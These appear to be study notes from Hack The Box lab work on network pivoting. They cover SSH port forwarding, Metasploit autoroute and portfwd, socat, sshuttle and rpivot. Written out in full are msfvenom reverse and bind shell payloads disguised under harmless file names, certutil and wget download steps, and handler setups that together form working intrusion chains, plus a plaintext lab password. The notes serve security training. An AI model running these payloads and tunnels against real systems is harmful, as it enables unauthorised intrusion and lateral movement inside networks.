# Pivoting, Tunneling, and Port Forwarding

### 1. Tunneling: The Theory of "Wrapping" Packets

When you send data over the internet, it travels in small packets. Every packet has a **header** (like the label on a shipping box showing the sender, receiver, and type of content). Firewalls read these labels to decide if they should let the packet pass or block it.

**Tunneling** is the trick of taking a blocked packet, stuffing it inside a _completely normal, allowed packet_, and sending it through the firewall.

#### How it works behind the scenes:

1. **The Blocked Protocol:** You want to send traffic that the firewall hates (like a database connection or a hacking tool command).
2. **The Wrapper:** Your tunneling tool takes that whole blocked packet and treats it like raw data. It wraps it inside a safe protocol that the firewall loves (like standard web browsing traffic, HTTPS, or SSH).
3. **The Delivery:** The firewall looks at the outer label, sees "Safe Web Traffic," and lets it pass.
4. **The Unwrapping:** Once the packet reaches the other side, the remote server strips away the outer "safe" wrapper, uncovers your original packet, and sends it to its real destination.

### 2. Port Forwarding: The Theory of "Direct Pipes"

An operating system uses **ports** (like room numbers in a giant hotel) to keep track of different network services. For example, website traffic goes to room 80, and database traffic goes to room 3306.

**Port Forwarding** is the act of connecting a room number on your computer directly to a room number on a remote computer.

#### How the two types work under the hood:

* **Static Port Forwarding (`-L` or `-R`):** This creates a single, rigid pipe. Your SSH tool tells the operating system: _"Listen to Port 9050 on my machine. Every time data drops into Port 9050, instantly send it down the SSH line and dump it into Port 3389 on the target machine."_ It is a blind, one-to-one connection. It does not know how to route to any other port or machine.
* **Dynamic Port Forwarding (`-D`):** This turns the remote computer into a smart middleman called a **SOCKS Proxy**. Instead of building a rigid pipe to just _one_ room, it sets up a dynamic system. When your tools (like `nmap` or a browser) send data to this proxy, they attach a tiny note saying: _"Please send this to IP 172.16.5.19 on Port 3389."_ The proxy reads the note, creates the connection on the fly, and passes the data.

### 3. Pivoting: The Theory of "Network Jumping"

**Pivoting** is not a specific tool or command; it is an architectural strategy. It is what you do when a company has properly split its network into different sections to keep hackers out.

#### The Problem: Network Blocks

Companies use **Dual-Homed** servers on the edge of their network. "Dual-homed" simply means the computer has **two network cards** plugged into two completely different networks at the same time:

* **Card 1 (Public):** Faces the outside internet. Your attack machine can talk to this card.
* **Card 2 (Internal):** Faces the hidden internal network. The high-value target databases are plugged into this network.

Your attack machine cannot talk directly to the internal targets because there is no physical or logical path connecting your computer to that internal network segment.

#### The Solution: The Pivot Point

When you compromise that edge server, you turn it into your **Pivot Point**.

Because that server lives in both worlds, you use a tunnel to pass your commands to it. The server then uses its second network card to repeat your commands into the internal network. To the target computers inside, the attack doesn't look like it's coming from a hacker on the internet—it looks like a normal, safe request coming from their own trusted neighbor server.

### Method 1: Local Port Forwarding (`-L`)

**The Golden Rule:** Connect to yourself (`127.0.0.1`). **Do not** use `proxychains`.

#### **Step 1: Create the Static Tunnel**

Run this on your Kali machine to map the remote RDP service to your local port `9050`:

Bash

```
ssh -L 9050:172.16.5.19:3389 ubuntu@10.129.202.64 -N
```

#### **Step 2: Connect to the Service**

Open a new terminal window on Kali and point your tool directly at your own loopback address on the specified port:

Bash

```
xfreerdp /v:127.0.0.1:9050 /u:Administrator /dynamic-resolution
```

### Method 2: Dynamic Port Forwarding (`-D`)

**The Golden Rule:** Connect to the target's real internal IP. **Must** use `proxychains`.

#### **Step 1: Create the Dynamic Tunnel (SOCKS Proxy)**

Run this on your Kali machine to open up a broad SOCKS proxy on port `9050`:

Bash

```
ssh -D 9050 ubuntu@10.129.202.64 -N
```

#### **Step 2: Verify Your Proxy Configuration**

Ensure the bottom of your `/etc/proxychains4.conf` file points to this local port:

Plaintext

```
socks5  127.0.0.1  9050
```

#### **Step 3: Connect to the Service / Scan**

Prefix your commands with `proxychains` and target the **actual internal network IP**:

*   **To RDP:**

    Bash

    ```
    proxychains xfreerdp /v:172.16.5.19 /u:Administrator /dynamic-resolution
    ```
*   **To Scan (Nmap):** _(Always use `-sT` and `-Pn` over SOCKS proxies)_

    Bash

    ```
    proxychains nmap -sT -Pn -p 3389 172.16.5.19
    ```

### Quick Reference Summary Table

| **Operational Need**                                                    | **Which Flag?** | **Target IP in Tool** | **Use proxychains?** | **Best Used For**                                                         |
| ----------------------------------------------------------------------- | --------------- | --------------------- | -------------------- | ------------------------------------------------------------------------- |
| Interact with **one specific service** reliably under heavy load.       | **`-L`**        | `127.0.0.1:9050`      | ❌ **NO**             | Interactive RDP sessions, stable database connections, single web panels. |
| Scan or interact with **multiple hosts/ports** across the whole subnet. |                 |                       |                      |                                                                           |

***

***

## Reverse Port Forwarding with SSH

Imagine a Windows computer trapped deep inside a building with no windows or doors to the outside world. The only thing it can talk to is an **Ubuntu Server** standing in the hallway.

You (the Attack Host) are standing outside the building. You can talk to the Ubuntu Server, but you cannot talk directly to the Windows computer.

If you try to tell the Windows computer to send a reverse shell straight to your attack box, the connection fails. The Windows computer simply doesn't know the road to reach your external network IP.

Plaintext

```
[ Your Attack Box ] <====== Can Talk ======> [ Ubuntu Server ] <====== Can Talk ======> [ Windows Host ]
[ Your Attack Box ] XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX [ Windows Host ]
                                      (No Direct Path Allowed!)
```

### The Solution: The Step-by-Step Strategy

To get your reverse shell, you have to trick the Windows host into thinking it is talking to its safe neighbor (the Ubuntu server), while the Ubuntu server silently pipes that connection backwards to your attack box.

#### Step 1: Making the Custom Payload

You use `msfvenom` to create a malicious executable (`backupscript.exe`) for the Windows machine.

* You do **not** put your attack box IP inside the payload.
* Instead, you tell the payload: _"When you run, connect to the Ubuntu Server's internal IP (`172.16.5.129`) on port `8080`."_

#### Step 2: Preparing Your Catcher (Metasploit)

On your own attack machine, you start a Metasploit multi/handler listener. You tell it to sit quietly and listen on **port 8000** for any incoming shell connections.

#### Step 3: Delivering the File

Since Windows can talk to Ubuntu, you copy the payload to the Ubuntu server (`scp`), start a quick Python web server on Ubuntu (`python3 -m http.server 8123`), and use a PowerShell command on the Windows target to download the file over the internal network.

#### Step 4: Building the Backwards Bridge (The Magic Step)

This is where the SSH command comes in. On your Attack Box, you run this exact command:

Bash

```
ssh -R 172.16.5.129:8080:0.0.0.0:8000 ubuntu@<IP_of_Ubuntu> -vN
```

**What this command tells the Ubuntu server to do:**

* **`-R` (Remote Forward):** _"Hey Ubuntu, open up port `8080` on your internal network card."_
* **`172.16.5.129:8080`**: This is the door Ubuntu opens for the Windows target.
* **`0.0.0.0:8000`**: _"If anyone knocks on your port 8080 door, grab that traffic, shove it backward through our active SSH tunnel, and drop it onto my attack machine at port 8000."_

### The Final Chain Reaction

Once that SSH bridge is active, you click execute on the Windows target. Here is how the traffic flows:

1. The Windows payload executes and says: _"Connecting to my neighbor, Ubuntu, on port 8080."_
2. The Ubuntu server receives the traffic on port 8080.
3. Because of your **`ssh -R`** command, Ubuntu says: _"I need to send this straight back down my secret SSH pipe to the hacker."_
4. The traffic pops out of the SSH tunnel right into your Metasploit listener on **port 8000**.
5. **Boom:** You get a successful Meterpreter session!

> **Why Metasploit says the connection is from `127.0.0.1`:** > When the shell arrives on your attack machine, Metasploit thinks it came from your own computer (`127.0.0.1`). This is because the local SSH application on your machine is the one unpacking the tunnel traffic and handing it to Metasploit locally.

### Phase 1: Creating the Windows Payload (`msfvenom`)

You run this command on your **Kali Attack Box** terminal to build the malicious `.exe` file.

Bash

```
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=172.16.5.129 LPORT=8080 -f exe -o backupscript.exe
```

#### Flag Breakdown:

* **`-p windows/x64/meterpreter/reverse_https`**: The type of shell we want. It targets 64-bit Windows systems and hides its traffic inside encrypted HTTPS web data.
* **`LHOST=172.16.5.129`**: This is the **most critical setting**. You do _not_ put your Kali IP here. You put the **Ubuntu Pivot Host's internal IP** because the Windows target can only talk to the Ubuntu server.
* **`LPORT=8080`**: The port on the Ubuntu server that the payload will call out to.
* **`-f exe`**: Tells the tool to package the payload as a standard Windows executable file.
* **`-o backupscript.exe`**: The output name of the file. Giving it a boring name like "backupscript" helps hide it from simple user suspicion.

### Phase 2: Preparing the Catcher (`msfconsole`)

Next, open Metasploit on your **Kali Attack Box** to prepare it to receive the incoming connection.

Bash

```
msfconsole
msf6 > use exploit/multi/handler
msf6 exploit(multi/handler) > set payload windows/x64/meterpreter/reverse_https
msf6 exploit(multi/handler) > set LHOST 0.0.0.0
msf6 exploit(multi/handler) > set LPORT 8000
msf6 exploit(multi/handler) > run
```

#### Why these settings?

* We use **`0.0.0.0`** so Metasploit listens on every network interface card inside your Kali machine.
* We use **`LPORT 8000`**. Notice this is different from the payload port (8080). Your Kali machine is going to catch the traffic on port 8000 after the SSH tunnel forwards it.

### Phase 3: Moving the Payload to the Windows Target

Since your Attack Box cannot talk to the Windows target directly, you use the Ubuntu server as a stepping stone to drop the file off.

#### Step A: Push the file to Ubuntu

From your Kali machine, send the file over to the Ubuntu server using Secure Copy Protocol (`scp`):

Bash

```
scp backupscript.exe ubuntu@10.129.202.64:~/backupscript.exe
```

#### Step B: Host the file on Ubuntu

SSH into the Ubuntu server, navigate to the folder containing `backupscript.exe`, and start a quick Python web server:

Bash

```
python3 -m http.server 8123
```

_(The Ubuntu server is now hosting the file on port 8123 like a mini website)._

#### Step C: Download the file onto Windows

Go to your Windows target (via your existing RDP session), open PowerShell, and pull the file down from the Ubuntu server's web server:

PowerShell

```
Invoke-WebRequest -Uri "http://172.16.5.129:8123/backupscript.exe" -OutFile "C:\backupscript.exe"
```

### Phase 4: Building the SSH Bridge (`ssh -R`)

Before you run the file on Windows, you must tell the Ubuntu server to route the connection back to you. On your **Kali Attack Box**, open a new terminal window and run:

Bash

```
ssh -R 172.16.5.129:8080:0.0.0.0:8000 ubuntu@10.129.202.64 -vN
```

#### Flag Breakdown:

* **`-R`**: Stands for **Remote Port Forwarding**. It tells the remote Ubuntu server to open a listening port on our behalf.
* **`172.16.5.129:8080`**: The door the Ubuntu server opens on the internal network. This matches the exact IP and port we hardcoded into our `msfvenom` payload in Phase 1.
* **`0.0.0.0:8000`**: Where the data goes next. It tells Ubuntu: _"Take whatever hits port 8080 and throw it backward through our SSH tunnel straight into my Kali box on port 8000."_
* **`-vN`**: `-v` makes the logs verbose (so you can see connections happening in real-time), and `-N` keeps the tunnel running without opening an unwanted command-line prompt.

### The Payoff (Execution)

Now everything is perfectly aligned:

1. Go to the **Windows Target** and double-click or run `C:\backupscript.exe`.
2. The payload sends a request to `172.16.5.129:8080`.
3. The **`ssh -R`** tunnel catches it on the Ubuntu server and funnels it straight back to your Kali machine.
4. Your Metasploit handler on port `8000` catches the stream and opens up your interactive **Meterpreter shell**.

***

***

## Meterpreter Tunneling & Port Forwarding

The main goal of this section is to perform network reconnaissance, scan for services, and catch reverse shells deep inside a hidden internal network (`172.16.5.0/23`) **entirely within the Metasploit Framework**, without relying on standard SSH commands.

### 1. Establishing the Initial Foothold

To use Metasploit's advanced features, you must first upgrade your access on the compromised edge server (Ubuntu) to an active **Meterpreter Session** (Session 1).

* **Payload Creation:** Create a Linux payload (`backupjob`) using `msfvenom` targeting your Kali machine's IP and port `8080`.
* **Execution:** Start a Metasploit `multi/handler` listener on your Kali box, transfer the file to the Ubuntu server, make it executable (`chmod +x`), and run it to establish **Session 1**.

### 2. Internal Network Discovery (Ping Sweep)

Once you have Session 1, you need to find live targets inside the hidden network.

* **Inside Meterpreter:** Use the `post/multi/gather/ping_sweep` module targeting the `172.16.5.0/23` network.
* **Manual Alternative:** Drop into a standard command shell on the target and use quick script one-liners (Bash, CMD, or PowerShell loops) to bounce ICMP ping requests off internal machines.

### 3. Dynamic Scanning (AutoRoute + SOCKS Proxy)

To use external tools like `nmap` against the hidden network, you can set up a global Metasploit bridge:

* **AutoRoute:** The `post/multi/manage/autoroute` module tells Metasploit to seamlessly pass any traffic bound for `172.16.5.0` straight into Session 1.
* **SOCKS Proxy:** The `auxiliary/server/socks_proxy` module opens up a proxy door on your local Kali machine (port `9050`).
* **Proxychains:** Adding `socks4 127.0.0.1 9050` to your `/etc/proxychains.conf` file allows you to prefix commands (`proxychains nmap <target>`) to scan internal assets natively.

### 4. Port Forwarding (Inbound & Outbound)

Metasploit uses the `portfwd` command inside a Meterpreter session to mirror specific network ports back and forth.

#### Local Port Forwarding (Pulling Services Out)

* **Command:** `portfwd add -l 3300 -p 3389 -r 172.16.5.19`
* **Use Case:** Connects a port on your local machine (`3300`) to a service on an internal host (like Remote Desktop on `3389`). Connecting your RDP tool to `localhost:3300` automatically routes you to the internal Windows target.

#### Reverse Port Forwarding (Catching Hidden Shells)

* **Command:** `portfwd add -R -l 8081 -p 1234 -L <Kali_IP>`
* **Use Case:** Used to catch a reverse shell from a machine that can only see the Ubuntu server.
  1. It opens port `1234` on the Ubuntu server.
  2. A Windows payload is configured to call back to the Ubuntu server on port `1234`.
  3. When executed on Windows, the Ubuntu server intercepts the traffic and pipes it backward to your waiting Metasploit listener on Kali port `8081`.

### Phase 1: Catching the Initial Ubuntu Session

Before doing any pivoting, you must get a Meterpreter shell on the intermediate Ubuntu server.

#### Step A: Generate the Linux Payload (On Kali Terminal) And Transfer To The Target

Bash

```
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=10.10.14.18 LPORT=8080 -f elf -o backupjob
```

* **`-p linux/x64/meterpreter/reverse_tcp`**: Specifies a 64-bit Linux Meterpreter reverse shell payload.
* **`LHOST=10.10.14.18`**: Your Kali Linux attack box IP address.
* **`LPORT=8080`**: The port on your Kali machine that will listen for the shell.
* **`-f elf`**: Compiles the payload as a native Linux executable file format (.elf).
* **`-o backupjob`**: Saves the file with the stealthy name `backupjob`.

#### Start a Web Server on Kali

Open a terminal window on Kali, change directories (`cd`) to where your `backupjob` payload is saved, and run:

Bash

```
python3 -m http.server 80
```

* **`python3 -m http.server`**: Tells Python to launch its built-in, lightweight web server module.
* **`80`**: Specifies the standard HTTP port. Your Kali machine is now hosting the contents of your current folder as a basic website.

#### Pull the File onto the Ubuntu Server

Go to your passwordless web shell terminal on the Ubuntu server and force it to download the file from your Kali IP (`10.10.14.18`):

Bash

```
wget http://10.10.14.18/backupjob -O /tmp/backupjob
```

_or if `wget` isn't installed, use `curl`:_

#### Pull the File onto the Windows Target

Go to your exploit terminal/web shell that controls the hidden Windows host, and tell Windows to download the payload from the Ubuntu server's internal IP address (`172.16.5.129`):

DOS

```
certutil.exe -urlcache -f http://172.16.5.129:80/backupscript.exe C:\Windows\Tasks\backupscript.exe
```

* **`certutil.exe`**: A legitimate, built-in Windows administrative tool used for managing certificates, but frequently utilized by security researchers to download files.
* **`-urlcache -f`**: Commands the utility to fetch the file directly from the specified URL and force an overwrite if a file with that name already exists.
* **`C:\Windows\Tasks\`**: The destination folder on Windows. Like the Linux `/tmp` directory, the `Tasks` folder is commonly configured with loose permissions, making it an ideal staging ground for executing your payload.

#### Step B: Start the Listener (Inside Msfconsole)

Bash

```
msf6 > use exploit/multi/handler
msf6 exploit(multi/handler) > set payload linux/x64/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > set LHOST 0.0.0.0
msf6 exploit(multi/handler) > set LPORT 8080
msf6 exploit(multi/handler) > run
```

* **`use exploit/multi/handler`**: Loads the general listener module to catch incoming connections.
* **`set LHOST 0.0.0.0`**: Tells your Kali machine to open up its ears on every available network interface to catch the callback.

#### Step C: Execute on the Ubuntu Server (Via Web Shell or SSH)

After transferring the `backupjob` file to the Ubuntu server, run these commands inside the Ubuntu terminal:

Bash

```
ubuntu@WebServer:~$ chmod +x backupjob
ubuntu@WebServer:~$ ./backupjob
```

* **`chmod +x`**: Gives the file executable permissions so the operating system allows it to run.
* **`./backupjob`**: Runs the file, opening **Session 1** in your Metasploit console.

### Phase 2: Internal Discovery (Ping Sweep)

Now that you have control of the Ubuntu server, use it to scan the hidden network.

#### Step A: Run the Sweep (Inside the Active Meterpreter Prompt)

Bash

```
meterpreter > run post/multi/gather/ping_sweep RHOSTS=172.16.5.0/23
```

* **`run post/multi/gather/ping_sweep`**: Launches a built-in post-exploitation scanning module.
* **`RHOSTS=172.16.5.0/23`**: The target network range. The Ubuntu server will send out ICMP ping requests to see which internal machines respond.

### Phase 3: Setting Up Global AutoRoute & SOCKS Proxy

This opens up a tunnel so your native Kali tools (like Nmap) can reach the hidden internal target (`172.16.5.19`).

#### Step A: Start the SOCKS Proxy Server (Inside Msfconsole)

Bash

```
msf6 > use auxiliary/server/socks_proxy
msf6 auxiliary(server/socks_proxy) > set SRVHOST 0.0.0.0
msf6 auxiliary(server/socks_proxy) > set SRVPORT 9050
msf6 auxiliary(server/socks_proxy) > set version 4a
msf6 auxiliary(server/socks_proxy) > run
```

* **`set SRVPORT 9050`**: Opens up port 9050 on your Kali machine to act as the local entry point for your proxy tools.
* **`run`**: Starts the SOCKS server as a background job.

#### Step B: Configure Proxychains (On your Kali Terminal)

Open a separate terminal window on your Kali machine and open the configuration file:

Bash

```
sudo nano /etc/proxychains.conf
```

Scroll to the very bottom of the file and verify or add this exact line:

Plaintext

```
socks4  127.0.0.1 9050
```

Save and exit the file (`Ctrl+O`, then `Ctrl+X`).

#### Step C: Enable AutoRoute (Inside Msfconsole)

Bash

```
msf6 > use post/multi/manage/autoroute
msf6 post(multi/manage/autoroute) > set SESSION 1
msf6 post(multi/manage/autoroute) > set SUBNET 172.16.5.0
msf6 post(multi/manage/autoroute) > run
```

* **`set SESSION 1`**: Links the routing to your active Ubuntu Meterpreter shell.
* **`set SUBNET 172.16.5.0`**: Tells Metasploit to intercept any traffic meant for this network and push it down the Session 1 tunnel.

#### Step D: Run Nmap Through the Tunnel (On Kali Terminal)

Bash

```
proxychains nmap 172.16.5.19 -p3389 -sT -v -Pn
```

* **`proxychains`**: Intercepts Nmap's traffic and forces it through the port 9050 proxy tunnel.
* **`-sT`**: **Mandatory.** Specifies a TCP Connect Scan. Standard stealth scans (`-sS`) will not work over a SOCKS proxy tunnel.
* **`-Pn`**: Skips the initial ping check since firewalls often block it.

### Phase 4: Local Port Forwarding (Pulling RDP Out)

Use this when you want to look at a specific port (like Remote Desktop 3389) on the hidden target.

#### Step A: Set up the Relay (Inside the Active Meterpreter Prompt)

Bash

```
meterpreter > portfwd add -l 3300 -p 3389 -r 172.16.5.19
```

* **`add`**: Creates a new port forward rule.
* **`-l 3300`**: Opens up port 3300 locally on your own Kali machine.
* **`-p 3389`**: The target port on the hidden machine (Windows RDP default port).
* **`-r 172.16.5.19`**: The IP address of the hidden internal Windows machine.

#### Step B: Connect to the Target (On Kali Terminal)

Bash

```
xfreerdp /v:localhost:3300 /u:victor /p:pass@123
```

* **`/v:localhost:3300`**: Tells the remote desktop client to connect to your own computer on port 3300. Metasploit catches this and transparently forwards the graphic interface back from the Windows target.

### Phase 5: Reverse Port Forwarding (Catching the Windows Shell)

Use this when you want the hidden Windows host to run an exploit and connect back to you.

#### Step A: Open the Reverse Intake Door (Inside the Active Meterpreter Prompt)

Bash

```
meterpreter > portfwd add -R -l 8081 -p 1234 -L 10.10.14.18
```

* **`-R`**: Specifies a **Reverse** port forward.
* **`-p 1234`**: Opens up port 1234 on the Ubuntu server's internal interface.
* **`-l 8081`**: The port on your Kali machine that will receive the final shell.
* **`-L 10.10.14.18`**: Your Kali machine's IP address.

#### Step B: Start the Catcher (Inside Msfconsole)

Send your current Meterpreter session to the background using the `bg` command, then start the listener:

Bash

```
meterpreter > bg
msf6 exploit(multi/handler) > set payload windows/x64/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > set LHOST 0.0.0.0
msf6 exploit(multi/handler) > set LPORT 8081
msf6 exploit(multi/handler) > run
```

* **`set LPORT 8081`**: Must match the `-l` port you used in Step A.

#### Step C: Generate the Windows Payload (On Kali Terminal)

Bash

```
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=172.16.5.129 LPORT=1234 -f exe -o backupscript.exe
```

* **`LHOST=172.16.5.129`**: The Ubuntu server's internal IP address. The Windows machine will call this address.
* **`LPORT=1234`**: The intake port you opened on Ubuntu in Step A.

#### Step D: Execute on the Windows Host

Transfer the `backupscript.exe` file to the Windows target and execute it.

* **The Result:** The payload calls the Ubuntu server on port 1234. Metasploit shifts the traffic backward through Session 1, drops it onto your Kali machine at port 8081, and logs you directly into a brand new Windows Meterpreter shell session!

***

***

## Socat Redirection with a Bind Shell

### Bind Shell Pivoting

With a bind shell pivot, the initiation path moves **forward** from your attack machine down to the target:

Plaintext

```
[ Kali Attack Box ] ──(Connects Outward)──> [ Ubuntu Pivot (Socat) ] ──(Forwards Outward)──> [ Windows Target ]
```

1. The Windows target runs a payload that opens an internal port and sits there listening.
2. `socat` sits on the Ubuntu server, opening a port facing your Kali machine.
3. Your Metasploit framework reaches _out_ to the Ubuntu server, and `socat` transparently pipes your active connection straight into the waiting Windows port.

### Step-by-Step Execution Blueprint

#### Step 1: Generate the Windows Bind Payload (On Kali Terminal)

You need to create an executable file that, when run, will force the Windows target to open a port and wait.

Bash

```
msfvenom -p windows/x64/meterpreter/bind_tcp -f exe -o backupjob.exe LPORT=8443
```

* **`-p windows/x64/meterpreter/bind_tcp`**: Specifies a 64-bit Windows Meterpreter **bind** payload instead of a reverse payload.
* **`LPORT=8443`**: The local port that the _Windows machine_ will open up to listen for connections internally.
* **`-o backupjob.exe`**: Saves the compiled binary executable.

#### Step 2: Transfer the Payload to the Windows Target

Before proceeding, you must move `backupjob.exe` onto the Windows target using the staging methods you learned previously:

1. Upload it from Kali to the Ubuntu pivot via an active foothold channel or Python web server.
2. Pull it from the Ubuntu pivot onto the Windows machine using a Windows utility like `certutil.exe`.

#### Step 3: Start the Socat Pipe (On the Ubuntu Pivot Host)

Run this command in your Ubuntu terminal window to bridge the two separate networks together:

Bash

```
ubuntu@Webserver:~$ socat TCP4-LISTEN:8080,fork TCP4:172.16.5.19:8443
```

* **`TCP4-LISTEN:8080,fork`**: Tells the Ubuntu server to open up port `8080` on the side facing your Kali machine, keeping it open dynamically for multiple connection requests.
* **`TCP4:172.16.5.19:8443`**: Directs `socat` to take any traffic hitting port 8080 and automatically throw it forward to the Windows target (`172.16.5.19`) on its specific bind listening port (`8443`).

#### Step 4: Execute the Payload on the Windows Target

Go to your command execution shell on the Windows target and execute the transferred file:

DOS

```
C:\Windows\Tasks\backupjob.exe
```

* The Windows machine now actively opens port `8443` on the internal network and sits silently waiting for a connection to arrive.

#### Step 5: Connect with the Metasploit Handler (On Kali Box)

Open your `msfconsole` on Kali. Since it is a bind shell, you do not wait for a connection; you actively tell Metasploit to go reach out and grab it.

Bash

```
msf6 > use exploit/multi/handler
msf6 exploit(multi/handler) > set payload windows/x64/meterpreter/bind_tcp
msf6 exploit(multi/handler) > set RHOST 10.129.202.64
msf6 exploit(multi/handler) > set LPORT 8080
msf6 exploit(multi/handler) > run
```

* **`set payload windows/x64/meterpreter/bind_tcp`**: Matches the bind structure of the executable payload running on Windows.
* **`set RHOST 10.129.202.64`**: The **Remote Host**. You point this directly at the Ubuntu pivot server's accessible external IP address because you cannot see the Windows IP directly.
* **`set LPORT 8080`**: The entry port you opened with `socat` on the Ubuntu machine.
* **`run`**: Metasploit fires an outbound connection to Ubuntu port 8080, `socat` intercepts it, shunts it to Windows port 8443, and your Meterpreter session initializes successfully.

### Reverse Socat vs. Bind Socat Layouts

| **Feature**                  | **Socat Reverse Shell Redirection**           | **Socat Bind Shell Redirection**               |
| ---------------------------- | --------------------------------------------- | ---------------------------------------------- |
| **Who Listens First?**       | 💻 Your Kali Attack Machine                   | 🪟 The Internal Windows Target                 |
| **Windows Target Command**   | Connects out to Ubuntu (`LHOST=172.16.5.129`) | Listens locally on its own face (`LPORT=8443`) |
| **Socat Redirection Rule**   | Listens for Windows, forwards to Kali         | Listens for Kali, forwards to Windows          |
| **Metasploit Handler Setup** | Uses `set LHOST 0.0.0.0` (Waits silently)     | Uses `set RHOST <Ubuntu_IP>` (Attacks out)     |

***

***

## SSH Providing With The SSHUTTLE

Standard SSH tunneling methods (like `ssh -D`) operate at the **Application Layer (Layer 7)** as a SOCKS proxy. Because your operating system doesn't natively know the proxy exists, you have to force your tools (like Nmap or web browsers) to use it by wrapping them inside another utility like `proxychains`.

`sshuttle` works entirely differently by operating at the **Network/Routing Layer (Layer 3)**.

When you run `sshuttle` on your attack machine (Kali), the tool executes the following automated steps:

1. **Creates a Local Redirector:** It starts a small local proxy listener on an arbitrary high port (e.g., `12300`) on your own machine.
2. **Hijacks the Routing Table:** It uses your local firewall utility (`iptables` or `nftables`) to rewrite your network routing rules. It tells your operating system: _"If any application tries to send traffic to the internal target subnet, intercept that traffic and send it directly to our local port 12300 instead."_
3. **Assembles the Remote Side via Python:** `sshuttle` connects over standard SSH to the intermediate pivot server (Ubuntu). Once authenticated, it automatically uploads and runs a tiny, native Python script on the pivot server.
4. **Multiplexes the Traffic:** When you run an attack tool against an internal IP, your local `iptables` catches it, sends it to `sshuttle`, which multiplexes the data stream over the encrypted SSH tunnel. The Python script on the pivot server unpacks the stream and sends standard packets directly out to the hidden internal target.

Because it manipulates the system's routing table, **your entire operating system behaves as though it is physically plugged directly into the internal network.** You do not need to use `proxychains`.

### 2. Prerequisites for Using `sshuttle`

To use the tool successfully, you must meet two main environmental requirements:

* **On the Attack Host (Kali):** You **must** have root/sudo privileges. The tool cannot modify your local `iptables` rules without administrative rights.
* **On the Pivot Host (Ubuntu/Linux):** The machine **must** have Python installed (Python 2.7 or Python 3). If Python is missing on the remote server, `sshuttle` will immediately crash during the handshake phase.

### 3. Core Commands and Syntax

#### Routing a Specific Internal Network

To tell `sshuttle` to route traffic intended for a hidden internal subnet (e.g., `172.16.5.0/23`) through your pivot host (`10.129.202.64`), execute the following command on your Kali terminal:

Bash

```
sudo sshuttle -r ubuntu@10.129.202.64 172.16.5.0/23
```

* **`sudo`**: Grants permission to modify local network routes.
* **`-r ubuntu@10.129.202.64`**: Specifies the **Remote** SSH connection string for the pivot host.
* **`172.16.5.0/23`**: The specific destination network block you want to route into the tunnel.

Once this command establishes a connection, it will sit open in your terminal. You can open a new terminal tab and run native tools normally:

Bash

```
nmap -sT -Pn 172.16.5.19
```

#### Routing All Traffic + Internal DNS Resolution

If the internal network uses private active directory domain names (like `corp.internal`) and you want to intercept both the traffic and domain name requests, run:

Bash

```
sudo sshuttle --dns -r ubuntu@10.129.202.64 0.0.0.0/0
```

* **`--dns`**: Intercepts your local DNS requests and passes them to the remote pivot network's DNS server so you can resolve internal names.
* **`0.0.0.0/0`**: Shorthand for "Everything." This routes 100% of your network traffic directly through the pivot server.

### 4. Key Limitations to Keep in Mind

* **TCP Only by Default:** `sshuttle` natively forwards TCP streams. Standard network pings (`ping 172.16.5.19`) use the ICMP protocol, which `sshuttle` will ignore. When scanning with Nmap, you **must** use the `-sT` (TCP Connect Scan) and `-Pn` (Skip Ping Check) flags.
* **Performance Drop over Double TCP:** Because it routes TCP packets inside an existing TCP SSH connection, high-bandwidth activities can experience packet delays if the network connection is unstable.

***

***

## Web Server Pivoting with Rpivot

**`rpivot`** is a reverse SOCKS proxy tool written in Python 2. It is designed to create encrypted tunnels out of highly restricted internal corporate networks back to your attack machine.

Here is a breakdown of what the tool does, why it is used, and a complete, flawless step-by-step guide to setting it up for your active Hack The Box lab.

### How `rpivot` Works Under the Hood

Standard forward proxies (like `ssh -D`) require your Kali machine to initiate the connection to the target server. However, secure networks block all inbound connections from the internet.

`rpivot` solves this by reversing the direction of the connection.

1. **The Server (`server.py`)** runs on your **Kali Attack Host**. It acts as a passive listener, waiting for a connection from inside the network.
2. **The Client (`client.py`)** runs on the compromised **Ubuntu Pivot Server**. It initiates an outbound connection (a "backconnect") to your Kali machine. Because firewalls generally allow outbound traffic more freely than inbound traffic, this connection easily bypasses the perimeter firewall.
3. Once the client links up with the server, a **SOCKS4 proxy tunnel** is established. Any tool you run on Kali through `proxychains` will now pass through this reverse tunnel straight into the internal network (`172.16.5.0/23`).

### Flawless Step-by-Step Setup Guide

Based on your active lab session, your public Ubuntu Pivot IP is **`10.129.94.144`**. Before starting, open a terminal on your Kali/Pwnbox machine and run `ip a` to find your local attack IP (let's assume it is `10.10.16.42` for this walkthrough—replace this with your actual tun0/eth0 IP).

#### Step 1: Start the Listener on your Kali Machine

Open a terminal on your Kali machine, navigate into the cloned `rpivot` directory, and start the proxy server:

Bash

```
python2 server.py --proxy-port 9050 --server-port 9999 --server-ip 0.0.0.0
```

* **`--proxy-port 9050`**: The local port on Kali where your tools (like proxychains) will feed their traffic.
* **`--server-port 9999`**: The port waiting to catch the inbound connection from the Ubuntu pivot.

#### Step 2: Transfer `rpivot` to the Ubuntu Pivot Host

Open a second terminal window on your Kali machine and upload the entire `rpivot` tool suite to the Ubuntu machine using your active SSH credentials:

Bash

```
scp -r rpivot ubuntu@10.129.94.144:/home/ubuntu/
```

_(When prompted, enter the password: `HTB_@cademy_stdnt!`)_

#### Step 3: Start the Client on the Ubuntu Pivot Host

SSH into the Ubuntu pivot host (or use your existing shell) and tell the client script to connect back to your Kali machine:

Bash

```
cd /home/ubuntu/rpivot
python2 client.py --server-ip 10.10.16.42 --server-port 9999
```

_Replace `10.10.16.42` with your actual Kali Attack Host IP._

**Verification:** Look back at your Kali terminal running `server.py`. You will immediately see a message stating: `New connection from host 10.129.94.144`. Your tunnel is now live!

#### Step 4: Configure Proxychains (Crucial Step)

Because `rpivot` strictly uses the older SOCKS4 protocol specification, you must ensure your configuration file matches it perfectly.

Open your configuration file on Kali:

Bash

```
sudo nano /etc/proxychains4.conf
```

Scroll to the absolute bottom of the file and ensure the active line reads exactly like this (change `socks5` to `socks4` if it is present):

Plaintext

```
[ProxyList]
socks4  127.0.0.1  9050
```

Save and exit (`Ctrl+O`, `Enter`, `Ctrl+X`).

#### Step 5: Interact with the Internal Web Server and Get the Flag

